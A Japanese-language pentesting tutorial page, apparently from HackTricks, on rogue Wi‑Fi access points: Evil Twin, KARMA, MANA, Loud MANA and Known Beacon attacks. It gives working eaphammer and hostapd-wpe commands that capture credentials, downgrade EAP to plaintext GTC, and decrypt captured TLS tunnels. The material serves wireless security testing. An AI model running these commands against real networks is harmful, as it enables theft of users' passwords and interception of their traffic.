また、**eaphammer** を使って Evil Twin を作成することもできます（eaphammer で evil twins を作成するには、インターフェースは **should NOT be** in **monitor** mode であることに注意してください）:
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
または Airgeddon を使用する: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

デフォルトでは、PNL にある ESSID が WPA 保護として保存されている場合、デバイスは自動的に Open evil Twin に接続しないことに注意してください。実際の AP に対して DoS を試みてユーザーが手動であなたの Open evil twin に接続することを期待するか、または実際の AP に DoS を仕掛けて WPA Evil Twin を使いハンドシェイクをキャプチャすることもできます（この方法では PSK を知らないため被害者をあなたに接続させることはできませんが、ハンドシェイクをキャプチャしてクラッキングを試みることはできます）。

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

**Evil Twin using WPA/2** を作成でき、デバイスがその SSID に WPA/2 で接続するように設定されていれば接続を試みます。とはいえ、**to complete the 4-way-handshake** するにはクライアントが使用する **password** を **know** している必要があります。もしそれを **don't know** であれば、**connection won't be completed**。
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

この攻撃を理解するために、まず簡潔な [WPA Enterprise explanation](#wpa-enterprise-mgt) を読むことをお勧めします。

**Using hostapd-wpe**

`hostapd-wpe` は動作するために **configuration** ファイルが必要です。これらの設定の生成を **automate** するには、[https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) を使用できます (_/etc/hostapd-wpe/_ 内の python ファイルをダウンロードしてください)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
設定ファイルでは、ssid、channel、user files、cret/key、dh parameters、wpa version、auth など、さまざまな項目を選択できます...

[**hostapd-wpe と EAP-TLS を使用して任意の証明書でログインを許可する。**](evil-twin-eap-tls.md)

**EAPHammer を使用する**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
デフォルトでは、EAPHammer は次の認証方式を使用します（GTC が最初に試され、plaintext passwords を取得しようとし、その後より堅牢な認証方式が使用されます）：
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
これは長時間の接続を避けるためのデフォルトの方法です。ただし、server に対して authentication methods を最も弱いものから最も強いものの順に指定することもできます:
```
--negotiate weakest
```
または、次を使用することもできます：

- `--negotiate gtc-downgrade` は、高効率な GTC downgrade 実装（plaintext passwords）を使用します。
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` は、提供される methods を手動で指定します（組織と同じ順序で同じ auth methods を提供すると、攻撃の検出がはるかに困難になります）。
- [詳しくは wiki を参照してください](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddon を使用する**

`Airgeddon` は事前に生成した証明書を使って WPA/WPA2-Enterprise ネットワークに EAP authentication を提供できます。偽ネットワークは接続プロトコルを EAP-MD5 にダウングレードするため、ユーザーとパスワードの MD5 を **capture** することができます。後で攻撃者はパスワードを crack しようと試みることができます。\
`Airggedon` は **continuous Evil Twin attack (noisy)** または **only create the Evil Attack until someone connects (smooth)** のいずれかの方法を提供します。

![](<../../images/image (936).png>)

### Evil Twins attacks における PEAP と EAP-TTLS の TLS トンネルのデバッグ

_この方法は PEAP 接続でテストされましたが、任意の TLS トンネルを復号しているため EAP-TTLS でも機能するはずです。_

hostapd-wpe の **configuration** 内で、_**dh_file**_ を含む行を **コメントアウト** します（`dh_file=/etc/hostapd-wpe/certs/dh` から `#dh_file=/etc/hostapd-wpe/certs/dh`へ）\
これにより `hostapd-wpe` は DH の代わりに **exchange keys using RSA** を行うようになり、後で **servers private key** を知っていればトラフィックを **decrypt** できるようになります。

この修正済み構成で通常どおり **`hostapd-wpe`** を使って **Evil Twin** を起動します。また、Evil Twin 攻撃を実行している **interface** で **`wireshark`** を起動します。

今すぐまたは後で（すでにいくつかの認証試行を capture している場合）`Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...` で秘密 RSA キーを wireshark に追加できます。

新しいエントリを追加し、フォームを次の値で埋めます：**IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File**（**select your key file**。問題を避けるため、**without being password protected** のキーファイルを選択してください）。

![](<../../images/image (687).png>)

そして新しい **"Decrypted TLS" tab** を確認します：

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons 攻撃

### ESSID と MAC ブラック/ホワイトリスト

Media Access Control Filter Lists (MFACLs) の異なるタイプと、それらが rogue Access Point (AP) の動作に与えるモードと影響：

1. **MAC-based Whitelist**:
- Rogue AP はホワイトリストに指定されたデバイスからの probe requests にのみ応答し、リストにない他のすべてのデバイスには見えない状態になります。
2. **MAC-based Blacklist**:
- Rogue AP はブラックリスト上のデバイスからの probe requests を無視し、結果として特定のデバイスに対して rogue AP が見えないようになります。
3. **SSID-based Whitelist**:
- Rogue AP はリストされた特定の ESSIDs に対する probe requests のみに応答し、Preferred Network Lists (PNLs) にそれらの ESSIDs を含まないデバイスには見えないようになります。
4. **SSID-based Blacklist**:
- Rogue AP はブラックリスト上の特定の ESSIDs に対する probe requests に応答せず、特定のネットワークを探しているデバイスからは見えないようになります。
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

This method allows an **attacker がネットワークに接続しようとするデバイスからのすべての probe requests に応答する悪意のある access point (AP) を作成する**。この技術は、デバイスが探しているネットワークを模倣することで、**デバイスを attacker's AP に接続させる**。デバイスがこの rogue AP に対して接続要求を送信すると接続が完了し、デバイスは誤って attacker のネットワークに接続してしまう。

### MANA

その後、**デバイスは信頼性の低いネットワーク応答を無視するようになり**、元の karma attack の効果は低下した。しかし、Ian de Villiers と Dominic White により導入された新しい手法、**MANA attack** が登場した。この手法は、rogue AP がデバイスの broadcast probe requests に応答して、デバイスが以前に保存したネットワーク名（SSIDs）を使い、**Preferred Network Lists (PNL) をデバイスから取得する**ことを伴う。この高度な攻撃は、デバイスが既知のネットワークを記憶し優先順位を付ける方式を悪用することで、元の karma attack に対する保護を回避する。

MANA attack は、デバイスからの directed and broadcast probe requests の監視によって動作する。directed request に対しては、デバイスの MAC address と要求されたネットワーク名を記録し、その情報をリストに追加する。broadcast request を受け取ると、AP はデバイスのリスト上のいずれかのネットワークに一致する情報で応答し、デバイスを rogue AP に接続させるよう誘導する。
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** は、デバイスが directed probing を使用しない場合や攻撃者に Preferred Network Lists (PNL) が知られていない場合に用いる高度な戦略です。これは、**同じエリア内のデバイスは PNLs にいくつかのネットワーク名を共有している可能性が高い** という原則に基づいて動作します。選択的に応答する代わりに、この攻撃は観測された全てのデバイスの結合された PNLs に見つかったすべてのネットワーク名 (ESSID) に対して probe responses をブロードキャストします。この広範な手法により、デバイスが馴染みのあるネットワークを認識して rogue Access Point (AP) に接続を試みる可能性が高まります。
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

**Loud MANA attack** が十分でない場合、**Known Beacon attack** は別の手法を提供します。  
この手法は、ワードリストから得た候補ESSIDsの一覧を順に切り替え、任意のネットワーク名に応答するAPをシミュレートすることで、接続プロセスをブルートフォースします。これにより多数のネットワークが存在するように見せかけ、被害者のPNL内のESSIDと一致することを期待して、偽造APへの接続試行を誘発します。より積極的にデバイスを誘き寄せるため、`--loud` オプションと組み合わせて攻撃を強化できます。

Eaphammer は、この攻撃を、リスト内のすべてのESSIDsが放送される形式の MANA attack として実装しています（`--loud` と組み合わせて Loud MANA + Known beacons attack を作ることもできます）：
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack** は **rapid-fire broadcasting of beacon frames for each ESSID listed in a file** を行います。これにより偽ネットワークが密集した環境が生まれ、特に MANA attack と組み合わせると、デバイスが rogue AP に接続する可能性が大幅に高まります。この手法は速度と量を利用してデバイスのネットワーク選択メカニズムを圧倒します。
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** は、従来の無線アクセスポイントを必要とせずに Wi‑Fi を使ってデバイス同士が直接接続できるプロトコルです。これはプリンターやテレビなどのさまざまな Internet of Things (IoT) デバイスに統合されており、デバイス間の直接通信を容易にします。Wi‑Fi Direct の注目すべき特徴は、接続を管理するために一方のデバイスがアクセスポイントの役割（group owner）を担う点です。

Wi‑Fi Direct 接続のセキュリティは **Wi-Fi Protected Setup (WPS)** によって確立され、以下のような安全なペアリング方法がサポートされています：

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

これらの方法は、特に PIN entry が、従来の Wi‑Fi ネットワークにおける WPS と同様の脆弱性に晒されやすく、同様の攻撃ベクトルの対象となります。

### EvilDirect Hijacking

**EvilDirect Hijacking** は Wi‑Fi Direct 特有の攻撃です。Evil Twin attack の概念を踏襲しますが、標的は Wi‑Fi Direct 接続になります。このシナリオでは、攻撃者が正当な group owner を偽装し、デバイスを悪意あるエンティティに接続させようとします。この手法は、`airbase-ng` のようなツールを使用して、偽装するデバイスの channel、ESSID、MAC address を指定することで実行できます：

## 参考資料

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: 以下を参照してください [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)（facebookでのログインと captive portals における WPA の模倣）

{{#include ../../banners/hacktricks-training.md}}
